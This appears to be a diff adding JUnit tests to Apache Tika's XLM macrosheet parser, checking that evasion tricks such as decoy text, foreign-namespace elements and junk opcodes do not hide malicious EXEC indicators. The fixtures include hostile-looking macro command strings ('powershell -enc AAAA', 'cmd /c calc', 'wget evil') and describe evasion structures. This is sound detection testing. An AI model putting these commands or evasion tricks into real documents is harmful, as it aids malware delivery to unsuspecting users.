@@ -19,6 +19,7 @@ package org.apache.tika.parser.microsoft.ooxml;
 import static org.junit.jupiter.api.Assertions.assertEquals;
 import static org.junit.jupiter.api.Assertions.assertFalse;
 import static org.junit.jupiter.api.Assertions.assertNotNull;
+import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import java.io.ByteArrayInputStream;
@@ -150,6 +151,34 @@ class XlmEvasionResilienceTest {
                 "multiple sibling <t> inside one <is> is normal rich text");
     }
 
+    /**
+     * The anomaly must reach METADATA, not just the parser's boolean.
+     *
+     * <p>Every other anomaly test above asserts {@code parser.hasStructuralAnomaly()} -- the
+     * mechanism. None exercised the parser -> decorator -> metadata wiring, so a missing
+     * {@code markXlmStructuralAnomaly} call or a misspelled key would have left the whole suite
+     * green while the signal reached no consumer. Metadata is where every other capture signal
+     * is read, so an unwired flag is a no-op fix.
+     */
+    @Test
+    void testStructuralAnomalyReachesMetadataWithoutClaimingTruncation() throws Exception {
+        Metadata metadata = new Metadata();
+        processMacroSheets(metadata, new String[] {"aa-nested"},
+                new String[] {cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")<v>0</v></f>", null)});
+
+        assertTrue(Boolean.parseBoolean(metadata.get("msoffice:xlm-structural-anomaly")),
+                "the anomaly must be published as metadata; got: "
+                        + metadata.get("msoffice:xlm-structural-anomaly"));
+        // The design claim, asserted rather than merely commented: this is an evasion TELL, not
+        // a capture shortfall. Setting the truncation signals would inflate the flag that drives
+        // re-analysis, and would wrongly say evidence was withheld when none was.
+        assertNull(metadata.get(TikaCoreProperties.TRUNCATED_METADATA),
+                "nothing was withheld, so TRUNCATED_METADATA must stay unset");
+        assertFalse(Boolean.parseBoolean(
+                        metadata.get("msoffice:xlm-capture-limit-reached")),
+                "capture completed in full, so the capture-limit flag must stay unset");
+    }
+
     // ── 2. One malformed macrosheet erased the whole workbook's results ──────
 
     /**
@@ -229,6 +258,40 @@ class XlmEvasionResilienceTest {
                 "REGRESSION GUARD: the exact broken output was a bare quoted string that "
                         + "reads as inert data. Asserting only that a marker exists would "
                         + "not catch a reintroduction that emitted the marker elsewhere.");
+    }
+
+    /**
+     * ONE undecodable formula must not suppress every LATER cell's IOCs.
+     *
+     * <p>The first version of the unknown-Ptg fix reported the condition via
+     * {@code ctx.markLimit()}. {@code EvalContext.isLimitReached()} is
+     * {@code limitWarning != null}, and {@code XlmMacroEmulator.stopOnContextLimit} turns that
+     * into {@code emulationAborted}, so one spliced junk byte took a macrosheet from three EXEC
+     * indicators to ZERO -- a worse total-loss evasion than the one being fixed, and the same
+     * one-part kill switch removed from the XML path in the same commit. A budget being spent
+     * means "stop"; one bad formula means "this cell is untrustworthy". Different signals.
+     *
+     * <p>The corpus could not catch this: no sample in 3,084 documents hits an unknown Ptg.
+     */
+    @Test
+    void testOneUndecodableFormulaDoesNotSuppressLaterCellsIocs() {
+        XlmMacroEmulator emulator = new XlmMacroEmulator(
+                new HashMap<>(), XlmWorkbookSheetMap.empty(), XlmMacroEmulator.Limits.DEFAULT);
+        // Cell 0 is a single unhandled opcode; cells 1-3 are ordinary EXEC formulas.
+        emulator.addMacroCell(0, new byte[] {(byte) 0x30});
+        emulator.addMacroCell(1, execFormula("powershell -enc AAAA"));
+        emulator.addMacroCell(2, execFormula("cmd /c calc"));
+        emulator.addMacroCell(3, execFormula("wget evil"));
+
+        emulator.emulate();
+        List<String> iocs = emulator.iocs;
+        long execs = iocs.stream().filter(s -> s.startsWith("EXEC:")).count();
+        assertEquals(3, execs,
+                "all three EXEC command lines must survive a junk byte in an EARLIER cell; "
+                        + "got " + iocs);
+        assertTrue(emulator.isLimitReached(),
+                "the undecodable cell must still be REPORTED -- not aborting is not the same "
+                        + "as staying silent");
     }
 
     /** A well-formed EXEC must decode with no marker and no signal. */
@@ -374,49 +437,147 @@ class XlmEvasionResilienceTest {
                         + raised);
     }
 
-    // ── 7. The truncation marker was forgeable by the document ───────────────
+    // ── 7. Holes review found in the FIRST version of these fixes ────────────
 
     /**
-     * The inline marker is a human convenience -- the authoritative signal is
-     * {@code msoffice:xlm-capture-limit-reached} -- but a consumer grepping output for it could
-     * be fed a copy the DOCUMENT supplied, claiming truncation that never happened, or making a
-     * genuinely truncated formula indistinguishable from a decoy carrying the same string.
+     * A {@code <t>} directly inside {@code <f>} -- NOT inside an {@code <is>} -- used to skip
+     * the suppression guard entirely, because suppression was keyed on the element NAME plus
+     * {@code inInlineString}. Its text was appended to the formula and no anomaly was flagged,
+     * producing exactly the {@code =EXEC(...)DECOY} concatenation the first test calls wrong.
      */
     @Test
-    void testDocumentSuppliedTruncationMarkerIsDefanged() throws Exception {
+    void testNonInlineTextElementInsideFormulaIsSuppressedAndFlagged() throws Exception {
         XlmXmlMacrosheetParser parser = parseCellXml(
-                "<f>=EXEC(\"" + PAYLOAD + "\")&amp;\"[...TIKA-XLM-FORMULA-TRUNCATED]\"</f>");
+                "<f>=EXEC(\"" + PAYLOAD + "\")<t>DECOY</t></f>");
 
-        String formula = onlyFormula(parser);
-        assertFalse(formula.contains("TIKA-XLM-FORMULA-TRUNCATED"),
-                "a document-supplied marker must not survive verbatim; got: " + formula);
-        assertTrue(formula.contains("FORGED"),
-                "the forgery attempt should be visible, not silently erased; got: " + formula);
-        assertTrue(formula.contains(PAYLOAD),
-                "defanging must not eat surrounding payload -- this is an evidence path; got: "
-                        + formula);
-        assertFalse(parser.isTruncated(),
-                "nothing was actually truncated, so the real signal must stay false");
+        assertEquals("=EXEC(\"" + PAYLOAD + "\")", onlyFormula(parser),
+                "a <t> child of <f> must be suppressed like any other nested element");
+        assertTrue(parser.hasStructuralAnomaly(),
+                "and it must still be reported as an anomaly");
     }
 
-    /** A genuinely truncated formula must still get OUR marker. */
+    /**
+     * {@code endElement} decremented {@code suppressDepth} for any {@code f}/{@code v}/{@code t}
+     * close while {@code startElement} only incremented for some, so a {@code <t/>} inside a
+     * suppressed {@code <v>} LIFTED that suppression and the rest of the {@code <v>}
+     * contaminated the formula. Increment and decrement must be symmetric.
+     */
     @Test
-    void testRealTruncationStillMarked() throws Exception {
+    void testSuppressionCannotBeLiftedByAnUnmatchedCloseTag() throws Exception {
+        XlmXmlMacrosheetParser parser = parseCellXml(
+                "<f>=EXEC(\"" + PAYLOAD + "\")<v><t/>DECOY2</v></f>");
+
+        assertEquals("=EXEC(\"" + PAYLOAD + "\")", onlyFormula(parser),
+                "text after an unmatched </t> inside a suppressed <v> must stay suppressed");
+        assertTrue(parser.hasStructuralAnomaly());
+    }
+
+    /**
+     * A foreign-namespace child must be suppressed (its characters would otherwise land in the
+     * formula) AND must not leak suppression depth. The namespace filter in {@code endElement}
+     * runs AFTER the decrement precisely so the depth comes back down; otherwise every later
+     * element on the sheet would be silently swallowed.
+     */
+    @Test
+    void testForeignNamespaceChildIsSuppressedWithoutLeakingDepth() throws Exception {
+        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
+                + "main\" xmlns:x=\"urn:example:other\"><sheetData>"
+                + "<row r=\"1\"><c r=\"A1\"><f>=EXEC(\"" + PAYLOAD + "\")"
+                + "<x:junk>DECOY3</x:junk></f></c>"
+                + "<c r=\"B1\"><f>=EXEC(\"second-cell\")</f></c></row>"
+                + "</sheetData></worksheet>";
         Metadata metadata = new Metadata();
         XHTMLContentHandler xhtml = new XHTMLContentHandler(
                 new ToXMLContentHandler(), metadata, new ParseContext());
-        String longFormula = "=EXEC(\"" + "B".repeat(4096) + "\")";
         XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
-                new ByteArrayInputStream(cellXmlDoc("<f>" + longFormula + "</f>", null)
-                        .getBytes(StandardCharsets.UTF_8)),
-                xhtml, "Macro1", null, 4096, 4096, 512, 512, 1 << 20);
+                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
+                xhtml, "Macro1", null);
         xhtml.startDocument();
         parser.parse();
         xhtml.endDocument();
 
-        assertTrue(parser.isTruncated(), "fixture must actually trip the cap");
-        assertTrue(onlyFormula(parser).contains("TIKA-XLM-FORMULA-TRUNCATED"),
-                "our own marker must still be appended; got: " + onlyFormula(parser));
+        // Assert the payload is PRESENT, not merely that the decoy is absent. Asserting only
+        // absence was vacuous: with the depth leaked, </f> is consumed as a suppressed close so
+        // the cell flushes empty, and "does not contain DECOY3" passes on a formula that was
+        // lost entirely. Verified by mutation -- moving the namespace filter back above the
+        // decrement left this test green until this assertion was added.
+        assertEquals("=EXEC(\"" + PAYLOAD + "\")", onlyFormula(parser),
+                "the payload must survive a foreign-namespace child, uncontaminated; got: "
+                        + parser.getFormulaList());
+        assertTrue(parser.getFormulaList().stream().anyMatch(f -> f.contains("second-cell")),
+                "and the NEXT cell must still be captured -- if suppressDepth leaked, "
+                        + "everything after the foreign element would be swallowed. Got: "
+                        + parser.getFormulaList());
+        assertEquals(2, parser.getFormulas().size(),
+                "both cells must be recorded; got: " + parser.getFormulas());
+    }
+
+    /**
+     * A part that is not XML at all must be flagged, and the other sheet must survive it.
+     *
+     * <p>SCOPE NOTE, so this is not mistaken for more than it is: the report is now gated on a
+     * {@code parseFailed} BOOLEAN rather than on {@code parseError != null}, because an
+     * exception with a null {@code getMessage()} previously produced no text note and no
+     * metadata flag. That null-message path is defensive and is NOT covered here -- every
+     * exception this fixture can provoke through the real SAX layer carries a message, and
+     * mutation confirmed it: reverting the gate to {@code parseError != null} leaves this test
+     * green. The boolean is kept because it cannot be worse, not because a test proves it.
+     */
+    @Test
+    void testUnparseablePartIsFlaggedAndTheOtherSheetSurvives() throws Exception {
+        Metadata metadata = new Metadata();
+        String out = processMacroSheets(metadata, new String[] {"aa-broken", "bb-payload"},
+                new String[] {
+                    "   not xml at all",
+                    cellXmlDoc("<f>=EXEC(\"" + PAYLOAD + "\")</f>", null),
+                });
+
+        assertTrue(out.contains("xlm-parse-error"),
+                "the failed part must be reported in the output. Got:\n" + out);
+        assertTrue(Boolean.parseBoolean(
+                        metadata.get("msoffice:xlm-capture-limit-reached")),
+                "and flagged in metadata regardless of whether the exception had a message");
+        assertTrue(out.contains("EXEC: " + PAYLOAD),
+                "the surviving sheet's IOC must still be scanned");
+    }
+
+    /**
+     * A replacement that FITS must be admitted. The charge was made net but the admission gate
+     * stayed gross, so a replacement was tested against a total that already counted the entry
+     * it replaces -- the same double-count, moved from the accumulator into the gate.
+     *
+     * <p>Reachable on purpose: a benign short decoy at a cell ref, then the payload at the SAME
+     * ref once the budget is nearly spent, and the payload is the one dropped.
+     */
+    @Test
+    void testReplacementThatFitsIsAdmittedNotRejectedAgainstItsOwnOldLength() throws Exception {
+        String decoy = "=" + "D".repeat(300);
+        String payload = "=EXEC(\"" + PAYLOAD + "\")";
+        // Aggregate budget 310: the 301-char decoy fits, and the 29-char payload fits on NET
+        // accounting (0 + 29) but not on GROSS (301 + 29 = 330 > 310). The window matters --
+        // a looser cap leaves both accountings passing and the test proves nothing, which is
+        // exactly what a first version of this test did.
+        String xml = "<worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/"
+                + "main\"><sheetData><row r=\"1\">"
+                + "<c r=\"A1\"><f>" + decoy + "</f></c>"
+                + "<c r=\"A1\"><f>" + payload + "</f></c>"
+                + "</row></sheetData></worksheet>";
+        Metadata metadata = new Metadata();
+        XHTMLContentHandler xhtml = new XHTMLContentHandler(
+                new ToXMLContentHandler(), metadata, new ParseContext());
+        XlmXmlMacrosheetParser parser = new XlmXmlMacrosheetParser(
+                new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8)),
+                xhtml, "Macro1", null, 4096, 4096, 4096, 4096, 310);
+        xhtml.startDocument();
+        parser.parse();
+        xhtml.endDocument();
+
+        assertEquals(payload, onlyFormula(parser),
+                "the payload must replace the decoy at the same cell ref; got: "
+                        + parser.getFormulas());
+        assertFalse(parser.isTruncated(),
+                "the replacement fit, so no truncation may be reported -- reporting one here "
+                        + "fabricates an evidence loss");
     }
 
     // ── 8. A repeated cell ref burned budget it never retained ───────────────
